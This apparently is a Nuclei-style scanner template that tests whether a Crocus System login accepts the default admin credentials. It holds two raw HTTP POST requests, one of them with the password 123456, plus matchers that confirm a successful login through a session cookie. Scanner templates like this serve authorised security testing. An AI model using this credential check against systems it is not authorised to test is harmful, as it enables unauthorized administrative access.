id: poc-yaml-crocus-default-password-login
info:
  name: Crocus System Default Credentials Login
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read
http:
  - raw:
      - |
        POST /RegisterLogin.do?Action=Login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        UserName=admin&Password=111111111111111&MailCode=&AuthCode=
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "\"Result\":\"false\""
          - "\"Code\":\"200\""
      - type: word
        part: header
        words:
          - "Saffron.U="
        negative: true
  - raw:
      - |
        POST /RegisterLogin.do?Action=Login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        UserName=admin&Password=123456&MailCode=&AuthCode=
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "\"Result\":\"true\""
          - "\"Code\":\"200\""
      - type: word
        part: header
        words:
          - "Saffron.U="
